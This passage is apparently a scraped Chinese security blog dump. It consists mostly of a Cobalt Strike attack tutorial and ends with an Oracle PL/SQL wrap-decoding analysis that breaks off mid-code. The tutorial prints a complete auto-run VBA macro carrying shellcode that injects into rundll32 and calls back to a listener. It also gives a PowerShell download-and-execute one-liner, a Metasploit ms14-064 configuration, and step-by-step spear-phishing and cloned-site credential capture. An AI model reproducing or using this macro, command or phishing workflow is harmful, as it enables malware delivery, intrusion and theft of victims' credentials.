stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb) 5、Windows 可执行文件（Stageless） Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb) 3.3.1 hta后门首先来到Attacks –&gt; Packages –&gt; HTML Application创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。选择监听器，通过Generate生成。注意：这里需要使用powershell的方式生成hat文件，否则会报错。选择保存的路径即可。 HTML应用文件生成好后，来到Attacks –&gt; Web Drive-by –&gt; Host File，选择刚才生成的文件。 最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。 当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。 3.3.2 宏病毒点击Attacks–&gt;Packages–&gt;MS Office Macro。 然后选择一个监听器，点击Generate，然后点击Copy Macro。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293Private Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long hStdInput As Long hStdOutput As Long hStdError As LongEnd Type#If VBA7 Then Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#Else Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open() Dim myByte As Long, myArray As Variant, offset As Long Dim pInfo As PROCESS_INFORMATION Dim sInfo As STARTUPINFO Dim sNull As String Dim sProc As String#If VBA7 Then Dim rwxpage As LongPtr, res As LongPtr#Else Dim rwxpage As Long, res As Long#End If myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,92,17,0,0,83,80,104,87,-119,-97, _-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _-1,-1,47,53,70,121,104,0,50,80,97,95,22,41,93,72,-68,23,25,-79,21,-58,45,-39,-82,48,-100,-118,-68,73,-49,-85,68,0,-113,-101,120,89,-123,63, _-29,90,-101,121,69,-115,57,47,114,24,76,106,-65,17,87,127,-26,-5,-31,12,-25,66,95,-58,-6,68,-81,121,-102,-128,-48,-35,-15,-63,-79,-74,-121,-9,-14,-79, _62,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,87,105,110,54,52,59,32,120,54,52,59,32,84,114, _105,100,101,110,116,47,54,46,48,59,32,65,118,97,110,116,32,66,114,111,119,115,101,114,41,13,10,0,-73,13,45,-79,112,-83,-23,-107,-3,-111,-103,89, _36,9,-76,-118,112,-67,-22,-128,44,-106,95,108,-37,-118,88,-92,7,106,51,114,-10,-13,47,43,46,90,-127,107,25,-25,-48,-10,41,-92,-2,52,47,46,17,44, _-32,103,-12,78,-62,4,-125,74,-111,117,55,-95,-86,-80,-26,6,-70,-21,-106,49,-126,37,-124,-10,63,-6,104,-9,-24,-66,-47,-112,75,-32,-71,-91,55,-78,29,0, _125,2,39,-99,-9,46,-91,24,93,-72,68,-15,-77,-118,44,102,46,88,41,-4,104,67,-97,92,-13,-86,40,-30,0,122,-89,-63,-85,-117,-61,106,-28,75,-78,-85, _2,-107,80,34,-82,-33,-51,-48,-19,-64,30,23,-94,-112,-62,-30,68,-81,76,58,-41,48,31,-22,-82,-54,-58,71,63,127,-73,-45,-23,64,15,110,9,-94,-9,-38, _124,-29,64,-104,-11,64,-115,28,-61,87,68,-30,127,1,-95,67,-46,124,98,57,-120,-40,-113,42,-64,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,50,53,49,46,48,46,51,53,0,25,105,-96,-115) If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then sProc = Environ(&quot;windir&quot;) &amp; &quot;\\\\SysWOW64\\\\rundll32.exe&quot; Else sProc = Environ(&quot;windir&quot;) &amp; &quot;\\\\System32\\\\rundll32.exe&quot; End If res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo) rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40) For offset = LBound(myArray) To UBound(myArray) myByte = myArray(offset) res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;) Next offset res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen() Auto_OpenEnd SubSub Workbook_Open() Auto_OpenEnd Sub 然后打开word编辑器，点击视图，然后点击宏，随便输入一个宏名，选择宏的位置，点击创建。 删除掉原来的代码，然后将复制的宏代码粘贴进去。 然后将文件另存为可启动宏的docm文件。 然后目标用户开启宏功能，主机就会成功在CS中上线。 查看宏功能开启情况可以在：文件–&gt;选线–&gt;信任中心–&gt;信任中心设置–&gt;宏设置。 打开该文件后，目标主机成功上线，进程名为rundll32.exe。 3.3.3 Payload Generator这个模块主要用于各种语言版本的shellcode，然后通过其他语言进行编译生成。 点击Attacks–&gt;Packages–&gt;Payload Generator 这里演示一下PowerShell和PowerShell Command的使用方法。 PowerShell的使用方法 先通过generate生成一个payload.ps1文件。 在目标机器上，powershell下执行如下命令，执行如下命令可以执行该脚本。 1Import-Module .\\payload.ps1 或 1.\\payload.ps1 PowerShell Command的使用方法 先通过generator生成payload.txt文件。 在目标机器上，powershell下执行该命令。 3.3.4 Windows Executable点击Attacks–&gt;Packages–&gt;Windows Executable。选择相应的监听器，若目标操作系统是64位的话，可以选择勾选x64。 通过Generate生成exe可执行文件，保存到指定路径。 将生成的文件上传到目标机器并执行，即可成功上线。 3.3.5 Windows Executable（S）这里再详细介绍一下Windows Executable与Windows Executable（S）的差别。 这两个模块直接用于生成可执行的exe文件或dll文件。Windows Executable是生成Stager类型的马，而Windows Executable（S）是生成Stageless类型的马。那Stager和Stageless有什么区别呢？ Stager是分阶段传送Payload。就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把 host_stage选项设置为false。 而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。 点击Attacks-&gt;Packages-&gt;Windows Executable。 选择对应的监听器和输出格式。 然后将生成的beacon.exe文件上传到目标机器上执行即可成功上线。 3.4 用户驱动的Web交付攻击用户驱动Web交付攻击User-Driven Web Drive-by Attacks功能打开位置：Attacks –&gt; Web Drive-by 1、Java 签名 applet 攻击 java 签名 applet 攻击Java Signed Applet Attack会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。 2、Java 智能 Applet 攻击 Java 智能 Applet 攻击Java Smart Applet Attack会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。 3、脚本化 Web 交付 脚本化 Web 交付Scripted Web Delivery 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery 4、托管文件 托管文件Host File通过Attacks –&gt; Web Drive-by –&gt; Host File进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。 如果想删除上传到CS服务端上的文件，可以到Attacks –&gt; Web Drive-by –&gt; Manage下进行删除。 如果想查看谁访问了这些文件，可以到View –&gt; Web Log下进行查看。 3.5 钓鱼模块3.5.1 Manage点击Attacks–&gt;Web Drive-by–&gt;Manage。 该模块可以查询CS服务端，现在能使用的模块代码。 3.5.2 System Profiler点击Attacks–&gt;Web Drive-by–&gt;System Profiler。 配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察 1231、View --&gt; Applications2、View --&gt; Web Log3、Cobalt Strike --&gt; Visualization --&gt; Target Table 目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。 注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。 3.5.3 Clone Site点击Attacks–&gt;Web Drive-by–&gt;Clone Site。 填写需要克隆的网站url地址、本地的url地址、以及对应的端口号即可，这里记得要开启键盘记录。 点击Clone会生成一个链接。 访问此链接与克隆的网址完全一致。 将生成的链接发送给目标用户，若目标用户输入账号及密码进行登录，我们就可以在View–&gt;Web Log中得到用户输入的内容。 3.5.4 Host File点击Attacks–&gt;Web Drive-by–&gt;Host File。 上传文件artifact.exe，填入本地的URL、Host及端口即可。 点击launch生成下载链接。 将生成的下载链接发送给目标用户，若目标用户访问链接并运行了下载文件。目标主机就会成功上线。 3.5.5 Clone Site + Host File网站下载模块也可以与网站克隆模块进行组合使用，具体如下。 首先克隆一个网站，然后填入需要克隆的URL地址，然后在Attack中添加刚刚生成的下载链接即可。 点击Clone，会生成一个链接。 将生成的链接发送给目标用户，在目标用户访问时会提示是否下载qq.exe文件，当客户端下载并点击运行。 Cobalt Strike监听到有受害人主机就会成功上线。 3.5.6 Clone Site + MSF这里我们使用 metasploit中的ms14-064溢出漏洞与Cobalt Strik进行钓鱼攻击。具体步骤如下： 打开metasploit，使用ms14-064模块，并如下配置参数。 1234567use exploit/windows/browser/ms14_064_ole_code_executionset SRVHOST 10.251.0.33set SRVPORT 8080set payload windows/meterpreter/reverse_tcpset lhost 10.251.0.33set lport 6666exploit -j 最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。 打开CS中的Clone Site模块，输入需要克隆的网站地址及本地的URL等信息。然后在Attack中填入刚刚生成的溢出利用代码。 然后通过Clone生成一个链接，将链接发送给目标用户。 若目标用户使用IE浏览器访问链接，便会返回meterpreter通道。 3.5.7 Spear PhishSpear Phish又叫鱼叉式网络钓鱼（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络钓鱼攻击。 由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织成员，故受窃信息已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密。 网络钓鱼是指诱导人们连接那些黑客已经锁定的目标。这种攻击方法的成功率很高，也非常常见。点击链接、打开表格或者连接其他一些文件都会感染病毒。一次简单的点击相当于为攻击者开启了一扇电子门，这样他就可以接触到你的内部弱点了。因为你已经同意他进入，他能够接触弱点，然后挖掘信息和授权连接。 用CS进行钓鱼需要四个步骤： 1、创建一个目标清单 2、制作一个邮件模板或者使用之前制作好的模板 3、选择一个用来发送邮件的邮件服务器 4、发送邮件 点击Attacks–&gt;Spear Phish。 下面简单介绍一下需要配置的一些参数。 targets是要发送邮箱地址的文件： 123123123@qq.comadmin@qq.comadmin@163.com template 是要发送邮件的模板，这个可以在个人邮箱中导出一个即可 attachment 放入我们制作好的宏病毒 embed url 填写我们制作好的钓鱼网站 Mail Server 填写本地搭建或者网上公开使用的smtp服务器 Bounce To 模仿发件人，自己添写即可 首先先要创建一个文件，用于存放要进行钓鱼攻击的邮箱。 然后再看看怎么导出模板文件，具体步骤如下。 1.打开qq邮箱，选择需要导出的模板文件，这里我以【X情报社区】积分即将下线提醒的邮件为例。 2.选择导出为eml文件。 3.然后将导出的文件保存到指定路径即可。 4.开启SMTP服务器 再导出模板文件以后，我们需要先开启SMTP服务器，这里以网易邮箱为例。在https://mail.163.com/注册一个163邮箱。 登陆邮箱，开启smtp服务。 在开启smtp服务时，系统会要求你发送一条短信。 在发送完短信以后，系统会给我们一个授权密码，用于在第三方服务器上使用smtp服务。 最后通过Clone Site创建一个钓鱼网站，进行钓鱼攻击，这里以克隆tom邮箱为例。 准备就绪，现在开始制作钓鱼邮件，填入需要进行填写的内容。 查看send email，可以发现邮件成功发送。 这时候打开邮箱，也可以看到成功收到了邮件。 这时候若目标用户下载附件并打开，且在office开启了宏功能。主机就会成功上线。 在用户点击任意链接后，就会跳转到我们所创建的钓鱼网站，并会提示是否下载qq.exe。 若用户点击保存并运行，主机也会成功上线。而且如果目标主机在登陆框中输入了用户名密码，输入的内容也将被我们所得到。 3.5.8 Scripted Web Delivery（S）点击Attacks–&gt;Web Drive-by–&gt;Scripted Web Delivery（S） 设置监听器，选择需要使用的payload类型，这里以powershell为例。 点击Launch后，会生成一段powershell利用代码。 1powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot; 在目标机器上执行这段代码，就会从服务器上下载后门文件，主机就会成功上线。 参考资料 https://teamssix.com/year/201023-192553.html https://xz.aliyun.com/t/3975 https://payloads.online/tools/socat https://zhuanlan.zhihu.com/p/93718885 https://www.anquanke.com/post/id/156299 https://www.bilibili.com/video/BV16b411i7n5 https://www.freebuf.com/sectool/173366.html https://my.oschina.net/u/4300698/blog/3382230 https://segmentfault.com/a/1190000019290085 https://www.cnblogs.com/cthon/p/9151467.html https://www.secpulse.com/archives/127186.html https://www.freebuf.com/articles/web/231892.html https://klionsec.github.io/2017/09/23/cobalt-strike/ https://www.renfei.org/blog/introduction-to-spf.html https://www.cnblogs.com/backlion/p/10616308.html https://blog.csdn.net/hnjztyx/article/details/52910478 http://blog.leanote.com/post/snowming/62ec1132a2c9 https://blog.csdn.net/pipisorry/article/details/52269785 https://blog.csdn.net/l1028386804/article/details/86675559 https://www.freebuf.com/company-information/167460.html https://blog.csdn.net/qq_34101364/article/details/108062913 https://blog.csdn.net/github_35186068/article/details/80518681 https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/ https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/ https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/ https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/ https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf","tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"}],"categories":[{"name":"威胁猎捕","slug":"威胁猎捕","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"},{"name":"Cobalt Strike","slug":"威胁猎捕/Cobalt-Strike","permalink":"http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"}]},{"title":"Oracle Database 11g Wrap加密解密分析","date":"2021-07-03T03:17:57.000Z","path":"wiki/数据库安全/Oracle Database/Oracle-Database-11g-Wrap加密解密分析/","text":"[TOC] ​ Oracle为PL/SQL开发者提供的一种对他们所写的代码（oracle下的对象Package、Procedure、Function、Java Source等）进行加密的工具。当PL/SQL代码被加密以后，它就被描述为被“包装过”。使wrap工具对代码进行包装，wrap工具会取出含有要包装的代码的文件名并输出下面的文件： 1wrap iname=plain.sql oname=encrypted.plb ​ 因为代码被加密了，所以其细节被隐藏了，而且Oracle不提供解包装设备。但是我们可以编写我们自己的unwrap程序。 1. Oracle Wrap的文件格式​ Oracle为了防止自己的对象程序源码泄露，也对其做了wrap处理。因为许多PACKAGE、PROCEDURE等程序本身可能存在SQL注入漏洞，但是如果得不到源码，对其进行审计是很困难的。这样wrap在一定程度上也起到了保护作用。 ​ 这里随便找一个Oracle的PACKAGE为实例，这里我们找到kupd$data包程序，其代码如图所示： ​ 可以将所有被warp加密的*.plb文件内容，分为header和body（BASE64）。header包含有关被加密包的数据库版本，对象类型以及加密和未加密文本的长度信息。 ​ body包含使用BASE64编码的实际被加密的代码。 ​ header格式如下： 12345678910111213141516171819201. CREATE OR REPLACE PACKAGE kupd$data wrapped 2. a0000003. 14. abcd5. abcd6. abcd7. abcd8. abcd9. abcd10. abcd11. abcd12. abcd13. abcd14. abcd15. abcd16. abcd17. abcd18. abcd19. 920. abb 42e ​ 展开.plb文件时，可以忽略前20行。包装的代码的header提供有关PL/SQL代码类型的一些信息，下面是header的一些字段（不过，实际上，不需要它们来解密PL/SQL） ​ 第3行：​ 看起来像是数据库服务器相关的十六进制值，但是在大多数情况下，它们等于1。因此，使用此标头记录没有实际值。 ​ 第19行：​ 一个十六进制值，指定PL / SQL对象的类型（所有PL / SQL对象的类型）： 十六进制 对象类型 7 过程 8 函数 9 包 b 包体 d 类型 e 类型体 ​ 第20行： ​ header的最后一行包含两个十六进制值，中间用空格分隔。这些值包含长度信息。第一个值包含未加密文本的长度（不包含CREATE OR REPLACE部分）。第二个值包含不带标题且不带结尾LF（0x0A）和“ /”符号的包体的长度。 ​ body ​ 如前所述，加密的PL / SQL文本是BASE64编码的，需要解码后才能真正开始解包（解密）。BASE64解码主体的前20个字节包含包装（加密）主体的SHA1哈希值。主体的其余部分是一个编码的（使用编码表）压缩的字节流，其中包含源文本。 2. Oracle Wrap的加密机制​ Oracle加密的原理就是先对源码进行lz压缩，得到lz压缩串，然后对压缩串进行SHA-1运算得到40位的加密串，然后将加密串与压缩串拼接得到拼接字符串，然后对拼接字符串进行Oracle双字符转换（转换表）。最后将转换后的字符串进行base64编码，最终得到wrap的加密串。 3. Unwrap反向解密​ 通过上面的加密机制，反向操作达到解密目的。 3.1 base64解码得到Oracle双字符转换后字符串​ 首先，我们以一小段PL/SQL代码来测试分先加密字符串的结构，这里我先讲程序加密处理。如图所示，这里将create procedure a代码wrap之后变成了如下代码 1select dbms_ddl_wrap(&#x27;create procedure a&#x27;) from dual; ​ 为了进一步分析其加密字符串中的结构，我们利用如下print_warpped_str.sql代码： 1234with src as( select &#x27;procedure a&#x27; txt from dual ), wrap as( select src.txt, dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src )select rtrim( substr( wrap.wrap, instr(wrap.wrap, chr(10), 1, 20 ) + 1),chr(10)) from wrap; 18BgMHdmA3Qg9IbJmntlZoZQoHwcwg5nnm7+fMr2ywFxakaamb40d1Q== ​ ps: 12345678910111213141516171819202122232425262728293031323334353637383940414243oracle中trim，ltrim，rtrim函数用法oracle中trim，ltrim，rtrim函数用法该函数共有两种作用：第一种，即去除空格。例子：--TRIM去除指定字符的前后空格SQL&gt; SELECT TRIM(&#x27; dd df &#x27;) FROM dual;TRIM(&#x27;DDDF&#x27;)\\------------dd df--LTRIM去除指定字符的前面空格SQL&gt; SELECT LTRIM(&#x27; dd df &#x27;) FROM dual;LTRIM(&#x27;DDDF&#x27;)\\-------------dd df--RTRIM去除指定字符后面后空格SQL&gt; SELECT RTRIM(&#x27; dd df &#x27;) FROM dual;RTRIM(&#x27;DDDF&#x27;)\\------------- dd df第二种，去除指定的字符。trim只能去除单个字符，而ltrim和rtrim可以去除多个字符。trim去除字符的写法：--表示字符串string2去除前面|后面|前后面（leading|trailing|both）的字符string1，默认去除方式为bothSELECT TRIM(leading|trailing|both string1 FROM string2) FROM dual;例子：SQL&gt; SELECT trim(leading &#x27;d&#x27; from &#x27;dfssa&#x27;) FROM dual;TRIM(LEADING&#x27;D&#x27;FROM&#x27;DFSSA&#x27;)\\---------------------------fssaSQL&gt; SELECT trim(both &#x27;1&#x27; from &#x27;123sfd111&#x27;) FROM dual;TRIM(BOTH&#x27;1&#x27;FROM&#x27;123SFD111&#x27;)\\----------------------------23sfdSQL&gt; SELECT trim(trailing &#x27;2&#x27; from &#x27;213dsq12&#x27;) FROM dual;TRIM(TRAILING&#x27;2&#x27;FROM&#x27;213DSQ12&#x27;)\\------------------------------213dsq1 ​ 进一步对这段代码做base64解码，获得经过Oracle双字符转换后的字符串，如图所示： 1234with src as( select &#x27;procedure a&#x27; txt from dual ), wrap as( select src.txt, dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src )select utl_encode.base64_decode( utl_raw.cast_to_raw( rtrim( substr( wrap.wrap, instr(wrap.wrap, chr(10), 1, 20 ) + 1),chr(10)))) from wrap; 1F0180C1DD980DD083D21B2669ED959A194281F07308399E79BBF9F32BDB2C05C5A91A6A66F8D1DD5 因为字符串是由两部分组成，先经过LZ压缩，然后经过SHA-1处理，然后再将SHA-1字符串和压缩字符串拼接得到，因为SHA-1总共40位，所以40位以后的全为经过Oracle双字符转换的压缩串，也就是 1308399E79BBF9F32BDB2C05C5A91A6A66F8D1DD5 3.2 计算Oracle双字符转换表​ 当wrap完成sha-1字符串和压缩字符串的拼接之后，会对照一个字符代替表进行Oracle双字符转换。这个表可能是Oracle的商业机密，所以官方没有给出该表的信息。 ​ 但是，我们已经得到了经过字符转换之后的LZ压缩串，同时我们可以通过LZ算法得到的LZ压缩串，通过对比这两个字符串，我们便可以推算出这个转换表。 3.2.1 创建LZ压缩包​ 关于LZ压缩，这里用老外提供的一个JAVA包，为了爆破转换表，我们先把JAVA包创建好，用以进行LZ压缩与解压，LZ_java.sql，如下所示（用SYS用户）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647create or replace java source named UNWRAPPERasimport java.io.*;import java.util.zip.*;public class UNWRAPPER&#123; public static String Inflate( byte[] src ) &#123; try &#123; ByteArrayInputStream bis = new ByteArrayInputStream( src ); InflaterInputStream iis = new InflaterInputStream( bis ); StringBuffer sb = new StringBuffer(); for( int c = iis.read(); c != -1; c = iis.read() ) &#123; sb.append( (char) c ); &#125; return sb.toString(); &#125; catch ( Exception e ) &#123; &#125; return null; &#125; public static byte[] Deflate( String src, int quality ) &#123; try &#123; byte[] tmp = new byte[ src.length() + 100 ]; Deflater defl = new Deflater( quality ); defl.setInput( src.getBytes( &quot;UTF-8&quot; ) ); defl.finish(); int cnt = defl.deflate( tmp ); byte[] res = new byte[ cnt ]; for( int i = 0; i &lt; cnt; i++ ) res = tmp; return res; &#125; catch ( Exception e ) &#123; &#125; return null; &#125;&#125;/alter java source UNWRAPPER compile/ ​ 这里deflate函数实现LZ压缩，而inflate则实现解压。 ​ 然后用包把JAVA声明进来，create_amosunwrapper.sql： 1234567891011121314151617181920212223242526272829303132create or replace package amosunwrapperis function deflate( src in varchar2 ) return raw; function deflate( src in varchar2, quality in number ) return raw; function inflate( src in raw ) return varchar2;end;/create or replace package body amosunwrapperis function deflate( src in varchar2 ) return raw is begin return deflate( src, 6 ); end; function deflate( src in varchar2, quality in number ) return raw as language java name &#x27;UNWRAPPER.Deflate( java.lang.String, int ) return byte[]&#x27;; function inflate( src in raw ) return varchar2 as language java name &#x27;UNWRAPPER.Inflate( byte[] ) return java.lang.String&#x27;;end;/ 3.2.2 比较LZ压缩串和base64解码串​ 创建好LZ压缩包，来看一下，LZ串和base64解码串的对比， ​ 首先，使用JAVA包，需要设置压缩级别参数，这个等级参数不一样，压缩得到的字符串完全不一样。我们可以从０等级开始一个一个进行测试，经过测试发现，Oracle用的是9等级。 ​ 所以，我们用以下代码对比两个字符串：comp_lz_and_base64.sql： 12345678910with src AS ( select &#x27;procedure a&#x27; txt from dual ), wrap as ( select src.txt , dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src ), subst as (select substr( utl_encode.base64_decode( utl_raw.cast_to_raw(rtrim( substr( wrap.wrap, instr( wrap.wrap, chr( 10 ), 1, 20 ) + 1 ), chr(10) ) ) ), 41 ) x, amosunwrapper.deflate( wrap.txt || chr(0), 9 ) d from wrap ) select substr( x, r * 2 - 1, 2 ) c_base64, substr( d, r * 2 - 1, 2 ) c_translatecode from subst , ( select rownum r from dual connect by rownum &lt;= ( select length( x ) / 2 from subst ) ); ​ 结果如下： ​ 通过对结果的排序，没有出现同一个base64编码对应不同的十六进制的情况，因此我们知道了可以用这个SQL为基础，通过用不同的串来产生替换表的内容。 3.2.3 计算替换表​ 首先建一个IDLTRANSLATE表来存储替换表的内容，create_idltranslate.sql： 123456CREATE TABLE SYS.IDLTRANSLATE ( C_BASE64DECODE VARCHAR2(2) NOT NULL, C_LZDEFLATECODE VARCHAR2(2) NULL )/ ​ 然后写一段PL/SQL块来生成替换表的内容，储存到IDLTRANSLATE表，generate_idltranslate.sql： 12345678910111213141516171819202122232425262728293031323334declare nCnt integer; nLoop integer; nSLoop integer; nCharmax integer; nCharmin integer; vChar Varchar2(3); cursor getchar is with src AS ( select &#x27;procedure &#x27;||vChar txt from dual ), wrap as ( select src.txt , dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src ), subst as (select substr( utl_encode.base64_decode( utl_raw.cast_to_raw(rtrim( substr( wrap.wrap, instr( wrap.wrap, chr( 10 ), 1, 20 ) + 1 ), chr(10) ) ) ), 41 ) x,amosunwrapper.deflate( wrap.txt || chr(0), 9 ) d from wrap ) select substr( x, r*2 - 1, 2 ) xr ,substr( d, r*2 - 1, 2 ) dr from subst , ( select rownum r from dual connect by rownum &lt;= ( select length( x ) / 2 from subst ) );begin nCharmax:=97; nCharmin:=122; For nLoop In 97..122 Loop For nSloop In 0..99 Loop vChar := chr(nLoop)||to_char(nSloop); For abc In getchar Loop Select Count(*) Into nCnt From sys.idltranslate WHERE c_base64decode = abc.xr; If nCnt &lt; 1 Then Insert INTO sys.idltranslate 